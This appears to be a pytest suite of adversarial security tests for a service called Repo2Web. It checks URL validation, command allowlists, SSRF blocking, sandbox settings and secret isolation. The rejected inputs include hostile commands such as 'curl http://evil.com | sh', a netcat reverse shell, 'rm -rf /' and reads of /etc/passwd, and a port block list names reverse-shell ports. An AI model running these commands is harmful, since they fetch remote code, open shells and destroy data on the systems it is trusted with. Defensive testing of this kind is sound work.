"""
Adversarial security tests for Repo2Web.

Tests actual attack scenarios against the security boundary.
Every test validates a specific threat vector from the threat model.
"""

import pytest
import re
from unittest.mock import patch, MagicMock, AsyncMock
from datetime import datetime, timezone


# ============================================================================
# F-001: URL Path Traversal Tests
# ============================================================================


class TestURLPathTraversal:
    """F-001: Validate that URL path traversal is blocked."""

    def test_rejects_double_dot_traversal(self):
        """URLs with /../ must be rejected."""
        from app.security.validation import validate_github_url
        is_valid, _ = validate_github_url("https://github.com/user/repo/../../../etc/passwd")
        assert is_valid is False

    def test_rejects_encoded_traversal(self):
        """URL-encoded traversal sequences must be rejected."""
        from app.security.validation import validate_github_url
        is_valid, _ = validate_github_url("https://github.com/user/repo/%2e%2e/%2e%2e/etc/passwd")
        assert is_valid is False

    def test_rejects_backslash_traversal(self):
        """Backslash traversal must be rejected."""
        from app.security.validation import validate_github_url
        is_valid, _ = validate_github_url("https://github.com/user/repo\\..\\..\\windows\\system32")
        assert is_valid is False

    def test_rejects_shell_metacharacters_in_url(self):
        """Shell metacharacters in URL must be rejected."""
        from app.security.validation import validate_github_url
        is_valid, _ = validate_github_url("https://github.com/user/repo;rm -rf /")
        assert is_valid is False
        is_valid, _ = validate_github_url("https://github.com/user/repo`whoami`")
        assert is_valid is False
        is_valid, _ = validate_github_url("https://github.com/user/repo$(whoami)")
        assert is_valid is False

    def test_rejects_url_with_newlines(self):
        """URLs with newlines must be rejected (CRLF injection)."""
        from app.security.validation import validate_github_url
        is_valid, _ = validate_github_url("https://github.com/user/repo\nEvil-Header: true")
        assert is_valid is False

    def test_rejects_excessively_long_url(self):
        """Excessively long URLs must be rejected."""
        from app.security.validation import validate_github_url, MAX_URL_LENGTH
        long_path = "a" * (MAX_URL_LENGTH + 100)
        is_valid, _ = validate_github_url(f"https://github.com/user/{long_path}")
        assert is_valid is False

    def test_allows_valid_github_urls(self):
        """Valid GitHub URLs must be accepted."""
        from app.security.validation import validate_github_url
        is_valid, _ = validate_github_url("https://github.com/user/repo")
        assert is_valid is True
        is_valid, _ = validate_github_url("https://github.com/user/repo/tree/main/src")
        assert is_valid is True

    def test_rejects_non_github_hosts(self):
        """Non-GitHub hosts must be rejected."""
        from app.security.validation import validate_github_url
        is_valid, _ = validate_github_url("https://evil.com/user/repo")
        assert is_valid is False

    def test_rejects_http_scheme(self):
        """HTTP URLs must be rejected."""
        from app.security.validation import validate_github_url
        is_valid, _ = validate_github_url("http://github.com/user/repo")
        assert is_valid is False

    def test_rejects_ssh_urls(self):
        """SSH URLs must be rejected."""
        from app.security.validation import validate_github_url
        is_valid, _ = validate_github_url("git@github.com:user/repo.git")
        assert is_valid is False

    def test_rejects_file_protocol(self):
        """file:// URLs must be rejected."""
        from app.security.validation import validate_github_url
        is_valid, _ = validate_github_url("file:///etc/passwd")
        assert is_valid is False


# ============================================================================
# F-002: Build Command Injection Tests
# ============================================================================


class TestBuildCommandInjection:
    """F-002: Validate that build command injection is blocked."""

    def test_rejects_semicolon_in_command(self):
        """Commands with semicolons must be rejected."""
        from app.runtime.executor import BuildExecutor
        executor = BuildExecutor.__new__(BuildExecutor)
        with pytest.raises(Exception):
            executor._validate_build_command("pip install flask;rm -rf /")

    def test_rejects_pipe_in_command(self):
        """Commands with pipes must be rejected."""
        from app.runtime.executor import BuildExecutor
        executor = BuildExecutor.__new__(BuildExecutor)
        with pytest.raises(Exception):
            executor._validate_build_command("pip install flask | sh")

    def test_rejects_backtick_in_command(self):
        """Commands with backticks must be rejected."""
        from app.runtime.executor import BuildExecutor
        executor = BuildExecutor.__new__(BuildExecutor)
        with pytest.raises(Exception):
            executor._validate_build_command("pip install `whoami`")

    def test_rejects_dollar_paren_in_command(self):
        """Commands with $(...) must be rejected."""
        from app.runtime.executor import BuildExecutor
        executor = BuildExecutor.__new__(BuildExecutor)
        with pytest.raises(Exception):
            executor._validate_build_command("pip install $(whoami)")

    def test_rejects_ampersand_in_command(self):
        """Commands with && must be rejected."""
        from app.runtime.executor import BuildExecutor
        executor = BuildExecutor.__new__(BuildExecutor)
        with pytest.raises(Exception):
            executor._validate_build_command("pip install flask && rm -rf /")

    def test_rejects_not_in_allowlist(self):
        """Commands not in the allowlist must be rejected."""
        from app.runtime.executor import BuildExecutor
        executor = BuildExecutor.__new__(BuildExecutor)
        with pytest.raises(Exception):
            executor._validate_build_command("curl http://evil.com | sh")
        with pytest.raises(Exception):
            executor._validate_build_command("wget http://evil.com/evil.sh && bash")
        with pytest.raises(Exception):
            executor._validate_build_command("nc -e /bin/sh 10.0.0.1 4444")
        with pytest.raises(Exception):
            executor._validate_build_command("dd if=/dev/sda of=/dev/sdb")

    def test_rejects_excessively_long_command(self):
        """Excessively long commands must be rejected."""
        from app.runtime.executor import BuildExecutor, MAX_COMMAND_LENGTH
        executor = BuildExecutor.__new__(BuildExecutor)
        long_cmd = "pip install " + "a" * (MAX_COMMAND_LENGTH + 100)
        with pytest.raises(Exception):
            executor._validate_build_command(long_cmd)

    def test_rejects_empty_command(self):
        """Empty commands must be rejected."""
        from app.runtime.executor import BuildExecutor
        executor = BuildExecutor.__new__(BuildExecutor)
        with pytest.raises(Exception):
            executor._validate_build_command("")

    def test_rejects_null_bytes(self):
        """Commands with null bytes must be rejected."""
        from app.runtime.executor import BuildExecutor
        executor = BuildExecutor.__new__(BuildExecutor)
        with pytest.raises(Exception):
            executor._validate_build_command("pip install flask\x00;rm -rf /")

    def test_allows_valid_commands(self):
        """Valid build commands must be accepted."""
        from app.runtime.executor import BuildExecutor
        executor = BuildExecutor.__new__(BuildExecutor)
        assert executor._validate_build_command("pip install flask") == "pip install flask"
        assert executor._validate_build_command("npm install") == "npm install"
        assert executor._validate_build_command("node server.js") == "node server.js"


# ============================================================================
# F-003: Runtime Command Injection Tests
# ============================================================================


class TestRuntimeCommandInjection:
    """F-003: Validate that runtime command injection is blocked."""

    def test_rejects_semicolon_in_runtime_command(self):
        """Runtime commands with semicolons must be rejected."""
        from app.runtime.executor import RuntimeExecutor
        executor = RuntimeExecutor.__new__(RuntimeExecutor)
        with pytest.raises(Exception):
            executor._validate_runtime_command("python app.py;rm -rf /")

    def test_rejects_pipe_in_runtime_command(self):
        """Runtime commands with pipes must be rejected."""
        from app.runtime.executor import RuntimeExecutor
        executor = RuntimeExecutor.__new__(RuntimeExecutor)
        with pytest.raises(Exception):
            executor._validate_runtime_command("python app.py | nc evil.com 4444")

    def test_rejects_backtick_in_runtime_command(self):
        """Runtime commands with backticks must be rejected."""
        from app.runtime.executor import RuntimeExecutor
        executor = RuntimeExecutor.__new__(RuntimeExecutor)
        with pytest.raises(Exception):
            executor._validate_runtime_command("python `whoami`.py")

    def test_rejects_not_in_runtime_allowlist(self):
        """Runtime commands not in the allowlist must be rejected."""
        from app.runtime.executor import RuntimeExecutor
        executor = RuntimeExecutor.__new__(RuntimeExecutor)
        with pytest.raises(Exception):
            executor._validate_runtime_command("curl http://evil.com | sh")

    def test_allows_valid_runtime_commands(self):
        """Valid runtime commands must be accepted."""
        from app.runtime.executor import RuntimeExecutor
        executor = RuntimeExecutor.__new__(RuntimeExecutor)
        assert executor._validate_runtime_command("python app.py") == "python app.py"
        assert executor._validate_runtime_command("uvicorn main:app --host 0.0.0.0") == "uvicorn main:app --host 0.0.0.0"
        assert executor._validate_runtime_command("npm start") == "npm start"


# ============================================================================
# F-004: Entrypoint Injection Tests
# ============================================================================


class TestEntrypointInjection:
    """F-004: Validate that entrypoint injection from README is blocked."""

    def test_rejects_module_with_semicolon(self):
        """Module names with semicolons must be rejected."""
        from app.analyzer.entrypoint_detector import _validate_module_name
        assert _validate_module_name("main;rm -rf /") is None

    def test_rejects_module_with_pipe(self):
        """Module names with pipes must be rejected."""
        from app.analyzer.entrypoint_detector import _validate_module_name
        assert _validate_module_name("main|cat /etc/passwd") is None

    def test_rejects_module_with_backtick(self):
        """Module names with backticks must be rejected."""
        from app.analyzer.entrypoint_detector import _validate_module_name
        assert _validate_module_name("`whoami`") is None

    def test_rejects_module_with_dollar(self):
        """Module names with dollar signs must be rejected."""
        from app.analyzer.entrypoint_detector import _validate_module_name
        assert _validate_module_name("$(whoami)") is None

    def test_rejects_module_with_slash(self):
        """Module names with slashes must be rejected."""
        from app.analyzer.entrypoint_detector import _validate_module_name
        assert _validate_module_name("../../../etc/passwd") is None

    def test_rejects_oversized_module_name(self):
        """Oversized module names must be rejected."""
        from app.analyzer.entrypoint_detector import _validate_module_name
        assert _validate_module_name("a" * 201) is None

    def test_allows_valid_module_name(self):
        """Valid module names must be accepted."""
        from app.analyzer.entrypoint_detector import _validate_module_name
        assert _validate_module_name("main") == "main"
        assert _validate_module_name("app.main") == "app.main"
        assert _validate_module_name("src.app") == "src.app"
        assert _validate_module_name("_private") == "_private"

    def test_readme_injection_blocked(self):
        """README with injected commands must be safely handled."""
        from app.analyzer.entrypoint_detector import detect_entrypoint
        key_files = {
            "README.md": "Run with: uvicorn `rm -rf /`:app --host 0.0.0.0"
        }
        file_names = ["README.md", "main.py"]
        result = detect_entrypoint(key_files, file_names, "fastapi", "python")
        # Should NOT contain the injected command
        if result:
            assert "rm -rf" not in result.command


# ============================================================================
# F-005: SSRF Protection Tests
# ============================================================================


class TestSSRFProtection:
    """F-005: Validate SSRF protection against redirect bypass."""

    def test_blocks_redirect_to_private_ip(self):
        """Health check must block redirects to private IPs."""
        from app.security.ssrf import validate_url_ssrf
        is_safe, _ = validate_url_ssrf("https://github.com/user/repo")
        assert is_safe is True  # Direct GitHub access is safe

    def test_blocks_localhost(self):
        """URLs resolving to localhost must be blocked."""
        from app.security.ssrf import is_ip_blocked
        assert is_ip_blocked("127.0.0.1") is True
        assert is_ip_blocked("::1") is True

    def test_blocks_private_ranges(self):
        """URLs resolving to private IP ranges must be blocked."""
        from app.security.ssrf import is_ip_blocked
        assert is_ip_blocked("10.0.0.1") is True
        assert is_ip_blocked("172.16.0.1") is True
        assert is_ip_blocked("192.168.0.1") is True

    def test_blocks_cloud_metadata(self):
        """Cloud metadata endpoint must be blocked."""
        from app.security.ssrf import is_ip_blocked
        assert is_ip_blocked("169.254.169.254") is True

    def test_blocks_link_local(self):
        """Link-local addresses must be blocked."""
        from app.security.ssrf import is_ip_blocked
        assert is_ip_blocked("169.254.1.1") is True

    def test_blocks_ipv6_ula(self):
        """IPv6 ULA addresses must be blocked."""
        from app.security.ssrf import is_ip_blocked
        assert is_ip_blocked("fd00::1") is True

    def test_allows_public_ip(self):
        """Public IPs must be allowed."""
        from app.security.ssrf import is_ip_blocked
        assert is_ip_blocked("8.8.8.8") is False
        assert is_ip_blocked("1.1.1.1") is False

    def test_blocks_private_ip_dns_resolution(self):
        """URLs that resolve to private IPs must be blocked."""
        from app.security.ssrf import validate_url_ssrf
        with patch("app.security.ssrf.resolve_hostname", return_value=["10.0.0.1"]):
            is_safe, reason = validate_url_ssrf("https://github.com/user/repo")
            assert is_safe is False
            assert "blocked" in reason.lower()

    def test_blocks_unresolvable_host(self):
        """URLs with unresolvable hosts must be blocked."""
        from app.security.ssrf import validate_url_ssrf
        with patch("app.security.ssrf.resolve_hostname", return_value=[]):
            is_safe, _ = validate_url_ssrf("https://github.com/user/repo")
            assert is_safe is False


# ============================================================================
# F-006: Docker Config Validation Tests
# ============================================================================


class TestDockerConfigValidation:
    """F-006: Validate Docker config validation catches privileged mode."""

    def test_rejects_privileged_mode(self):
        """Privileged mode must be rejected."""
        from app.security.docker_security import validate_docker_config
        config = {"privileged": True}
        violations = validate_docker_config(config)
        assert any("privileged" in v.lower() for v in violations)

    def test_rejects_cap_add(self):
        """Capability addition must be rejected."""
        from app.security.docker_security import validate_docker_config
        config = {"cap_add": ["NET_ADMIN"]}
        violations = validate_docker_config(config)
        assert any("capability" in v.lower() for v in violations)

    def test_rejects_missing_cap_drop_all(self):
        """Missing cap_drop ALL must be rejected."""
        from app.security.docker_security import validate_docker_config
        config = {"cap_drop": ["SYS_ADMIN"]}
        violations = validate_docker_config(config)
        assert any("capabilit" in v.lower() for v in violations)

    def test_rejects_docker_socket(self):
        """Docker socket mount must be rejected."""
        from app.security.docker_security import validate_docker_config
        config = {"volumes": ["/var/run/docker.sock:/var/run/docker.sock"]}
        violations = validate_docker_config(config)
        assert any("docker.sock" in v for v in violations)

    def test_rejects_host_network(self):
        """Host network mode must be rejected."""
        from app.security.docker_security import validate_docker_config
        config = {"network_mode": "host"}
        violations = validate_docker_config(config)
        assert any("host" in v.lower() for v in violations)

    def test_rejects_host_pid(self):
        """Host PID mode must be rejected."""
        from app.security.docker_security import validate_docker_config
        config = {"pid_mode": "host"}
        violations = validate_docker_config(config)
        assert any("PID" in v for v in violations)

    def test_rejects_root_user(self):
        """Root user must be rejected."""
        from app.security.docker_security import validate_docker_config
        config = {"user": "root"}
        violations = validate_docker_config(config)
        assert any("root" in v.lower() for v in violations)

    def test_allows_valid_config(self):
        """Valid config must pass."""
        from app.security.docker_security import validate_docker_config
        config = {
            "user": "1000:1000",
            "cap_drop": ["ALL"],
            "cap_add": [],
            "security_opt": ["no-new-privileges:true"],
            "network_mode": "repo2web-isolated",
            "privileged": False,
        }
        violations = validate_docker_config(config)
        assert len(violations) == 0


# ============================================================================
# F-007/F-008: Log Sanitization Tests
# ============================================================================


class TestLogSanitization:
    """F-007/F-008: Validate log sanitization."""

    def test_strips_ansi_escape_sequences(self):
        """ANSI escape sequences must be stripped."""
        from app.services.deployment_log import sanitize_log_message
        msg = "\x1B[31mRED TEXT\x1B[0m normal"
        result = sanitize_log_message(msg)
        assert "\x1B" not in result
        assert "RED TEXT" in result
        assert "normal" in result

    def test_strips_control_characters(self):
        """Dangerous control characters must be stripped."""
        from app.services.deployment_log import sanitize_log_message
        msg = "test\x00\x01\x02message"
        result = sanitize_log_message(msg)
        assert "\x00" not in result
        assert "\x01" not in result
        assert "test" in result
        assert "message" in result

    def test_preserves_newlines_and_tabs(self):
        """Newlines and tabs must be preserved."""
        from app.services.deployment_log import sanitize_log_message
        msg = "line1\nline2\ttab"
        result = sanitize_log_message(msg)
        assert "\n" in result
        assert "\t" in result

    def test_truncates_long_messages(self):
        """Long messages must be truncated."""
        from app.services.deployment_log import sanitize_log_message, MAX_LOG_MESSAGE_LENGTH
        msg = "a" * (MAX_LOG_MESSAGE_LENGTH + 1000)
        result = sanitize_log_message(msg)
        assert len(result) <= MAX_LOG_MESSAGE_LENGTH + 100  # Allow for truncation marker
        assert "TRUNCATED" in result

    def test_handles_empty_message(self):
        """Empty messages must be handled gracefully."""
        from app.services.deployment_log import sanitize_log_message
        assert sanitize_log_message("") == ""
        assert sanitize_log_message(None) == ""

    def test_strips_null_byte_injection(self):
        """Null byte injection must be blocked."""
        from app.services.deployment_log import sanitize_log_message
        msg = "log entry\x00/etc/passwd"
        result = sanitize_log_message(msg)
        assert "\x00" not in result


# ============================================================================
# F-009/F-010: URL and Command Length Tests
# ============================================================================


class TestLengthLimits:
    """F-009/F-010: Validate length limits."""

    def test_url_length_limit(self):
        """URLs must have a maximum length."""
        from app.security.validation import validate_github_url, MAX_URL_LENGTH
        long_url = "https://github.com/user/" + "a" * (MAX_URL_LENGTH + 100)
        is_valid, _ = validate_github_url(long_url)
        assert is_valid is False

    def test_command_length_limit(self):
        """Commands must have a maximum length."""
        from app.runtime.executor import BuildExecutor, MAX_COMMAND_LENGTH
        executor = BuildExecutor.__new__(BuildExecutor)
        long_cmd = "pip install " + "a" * (MAX_COMMAND_LENGTH + 100)
        with pytest.raises(Exception):
            executor._validate_build_command(long_cmd)


# ============================================================================
# F-011: Configuration Security Tests
# ============================================================================


class TestConfigurationSecurity:
    """F-011: Validate configuration security."""

    def test_secret_key_not_default(self):
        """SECRET_KEY must not have a default production value."""
        from app.core.config import Settings
        settings = Settings()
        # In development, the default is empty string, not a known secret
        assert settings.SECRET_KEY != "change-me-in-production"

    def test_production_validation_catches_missing_secret(self):
        """Production validation must catch missing SECRET_KEY."""
        from app.core.config import Settings
        settings = Settings(
            APP_ENV="production",
            SECRET_KEY="",
            DATABASE_URL="postgresql+asyncpg://user:pass@remote-host:5432/db",
        )
        violations = settings.validate_for_production()
        assert any("SECRET_KEY" in v for v in violations)


# ============================================================================
# Sandbox Security Invariant Tests
# ============================================================================


class TestSandboxInvariants:
    """Validate sandbox security invariants."""

    def test_build_sandbox_no_root(self):
        """Build sandbox must not run as root."""
        from app.security.sandbox import SandboxConfig
        config = SandboxConfig.for_build()
        assert config.user != "root"
        assert not config.user.startswith("0:")

    def test_runtime_sandbox_no_root(self):
        """Runtime sandbox must not run as root."""
        from app.security.sandbox import SandboxConfig
        config = SandboxConfig.for_runtime()
        assert config.user != "root"
        assert not config.user.startswith("0:")

    def test_build_sandbox_drops_all_caps(self):
        """Build sandbox must drop ALL capabilities."""
        from app.security.sandbox import SandboxConfig
        config = SandboxConfig.for_build()
        assert "ALL" in config.cap_drop

    def test_runtime_sandbox_drops_all_caps(self):
        """Runtime sandbox must drop ALL capabilities."""
        from app.security.sandbox import SandboxConfig
        config = SandboxConfig.for_runtime()
        assert "ALL" in config.cap_drop

    def test_build_sandbox_no_new_privileges(self):
        """Build sandbox must have no-new-privileges."""
        from app.security.sandbox import SandboxConfig
        config = SandboxConfig.for_build()
        assert config.no_new_privileges is True

    def test_runtime_sandbox_no_new_privileges(self):
        """Runtime sandbox must have no-new-privileges."""
        from app.security.sandbox import SandboxConfig
        config = SandboxConfig.for_runtime()
        assert config.no_new_privileges is True

    def test_runtime_sandbox_read_only_rootfs(self):
        """Runtime sandbox must have read-only root filesystem."""
        from app.security.sandbox import SandboxConfig
        config = SandboxConfig.for_runtime()
        assert config.read_only_rootfs is True

    def test_no_host_volumes(self):
        """No host volumes must be mounted."""
        from app.security.sandbox import SandboxConfig
        config = SandboxConfig.for_build()
        assert len(config.volumes) == 0

    def test_no_cap_add(self):
        """No capabilities must be added."""
        from app.security.sandbox import SandboxConfig
        config = SandboxConfig.for_build()
        assert len(config.cap_add) == 0


# ============================================================================
# Secret Isolation Tests
# ============================================================================


class TestSecretIsolation:
    """Validate secret isolation controls."""

    def test_database_url_is_secret(self):
        """DATABASE_URL must be detected as secret."""
        from app.security.secrets import is_secret_env_var
        assert is_secret_env_var("DATABASE_URL") is True

    def test_redis_url_is_secret(self):
        """REDIS_URL must be detected as secret."""
        from app.security.secrets import is_secret_env_var
        assert is_secret_env_var("REDIS_URL") is True

    def test_github_token_is_secret(self):
        """GITHUB_TOKEN must be detected as secret."""
        from app.security.secrets import is_secret_env_var
        assert is_secret_env_var("GITHUB_TOKEN") is True

    def test_port_is_not_secret(self):
        """PORT must not be detected as secret."""
        from app.security.secrets import is_secret_env_var
        assert is_secret_env_var("PORT") is False

    def test_container_env_blocks_secrets(self):
        """Container environment must block secret variables."""
        from app.security.secrets import validate_container_env
        env = {
            "PORT": "8080",
            "DATABASE_URL": "postgresql://user:pass@host/db",
            "SECRET_KEY": "supersecret",
        }
        forbidden = validate_container_env(env)
        assert "DATABASE_URL" in forbidden
        assert "SECRET_KEY" in forbidden
        assert "PORT" not in forbidden


# ============================================================================
# Network Policy Tests
# ============================================================================


class TestNetworkPolicy:
    """Validate network policy security."""

    def test_blocked_cidrs_include_all_private_ranges(self):
        """All private IP ranges must be blocked."""
        from app.security.network import NetworkPolicy
        policy = NetworkPolicy(name="test")
        assert "10.0.0.0/8" in policy.BLOCKED_CIDRS
        assert "172.16.0.0/12" in policy.BLOCKED_CIDRS
        assert "192.168.0.0/16" in policy.BLOCKED_CIDRS

    def test_blocked_cidrs_include_loopback(self):
        """Loopback must be blocked."""
        from app.security.network import NetworkPolicy
        policy = NetworkPolicy(name="test")
        assert "127.0.0.0/8" in policy.BLOCKED_CIDRS

    def test_blocked_cidrs_include_metadata(self):
        """Cloud metadata must be blocked."""
        from app.security.network import NetworkPolicy
        policy = NetworkPolicy(name="test")
        assert "169.254.0.0/16" in policy.BLOCKED_CIDRS

    def test_blocked_ports_include_ssh(self):
        """SSH port must be blocked."""
        from app.security.network import NetworkPolicy
        policy = NetworkPolicy(name="test")
        assert 22 in policy.BLOCKED_PORTS

    def test_blocked_ports_include_reverse_shells(self):
        """Common reverse shell ports must be blocked."""
        from app.security.network import NetworkPolicy
        policy = NetworkPolicy(name="test")
        assert 4444 in policy.BLOCKED_PORTS
        assert 5555 in policy.BLOCKED_PORTS


# ============================================================================
# Audit Logging Tests
# ============================================================================


class TestAuditLogging:
    """Validate audit logging security."""

    def test_sensitive_fields_redacted(self):
        """Sensitive fields must be redacted from audit events."""
        from app.security.audit import SecurityEvent, SecurityEventType, redact_sensitive
        event = SecurityEvent(
            event_type=SecurityEventType.SECRET_DETECTED,
            timestamp=datetime.now(timezone.utc),
            details={"password": "hunter2", "token": "abc123"},
        )
        redacted = redact_sensitive(event)
        assert redacted.details["password"] == "[REDACTED]"
        assert redacted.details["token"] == "[REDACTED]"

    def test_non_sensitive_fields_preserved(self):
        """Non-sensitive fields must be preserved."""
        from app.security.audit import SecurityEvent, SecurityEventType, redact_sensitive
        event = SecurityEvent(
            event_type=SecurityEventType.BUILD_STARTED,
            timestamp=datetime.now(timezone.utc),
            details={"build_id": "abc123"},
        )
        redacted = redact_sensitive(event)
        assert redacted.details["build_id"] == "abc123"

    def test_event_is_immutable(self):
        """Security events must be immutable."""
        from app.security.audit import SecurityEvent, SecurityEventType
        event = SecurityEvent(
            event_type=SecurityEventType.BUILD_STARTED,
            timestamp=datetime.now(timezone.utc),
        )
        with pytest.raises(AttributeError):
            event.event_type = SecurityEventType.BUILD_COMPLETED
